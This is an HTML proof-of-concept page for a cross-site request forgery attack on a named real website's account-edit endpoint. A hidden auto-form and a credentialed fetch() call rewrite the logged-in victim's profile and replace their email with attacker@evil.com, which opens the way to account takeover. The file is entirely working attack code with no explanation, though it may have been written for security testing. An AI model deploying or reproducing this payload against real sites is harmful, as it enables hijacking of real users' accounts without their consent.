<!DOCTYPE html>
<html>
<head>
<title>CSRF PoC Debug</title>
</head>
<body>
<h1>CSRF PoC - Debug Mode</h1>

<form id="csrf-form" action="https://www.socialdeal.nl/modal/account/edit/" method="POST" target="_blank">
  <input type="hidden" name="salutation" value="male">
  <input type="hidden" name="firstName" value="Test">
  <input type="hidden" name="lastName" value="Tester2">
  <input type="hidden" name="birthDate" value="1995-04-04">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Submit (click me)">
</form>

<script>
  // Also try with fetch
  async function tryFetch() {
    try {
      const formData = new FormData();
      formData.append('salutation', 'male');
      formData.append('firstName', 'pwned');
      formData.append('lastName', 'pwned');
      formData.append('birthDate', '1995-04-04');
      formData.append('email', 'attacker@evil.com');
      
      const resp = await fetch('https://www.socialdeal.nl/modal/account/edit/', {
        method: 'POST',
        credentials: 'include',
        body: formData
      });
      const text = await resp.text();
      console.log('Response:', text);
      alert('Response: ' + text);
    } catch(e) {
      console.error('Fetch error:', e);
      alert('Error: ' + e.message);
    }
  }
</script>

<button onclick="tryFetch()">Try with fetch()</button>
</body>
</html>
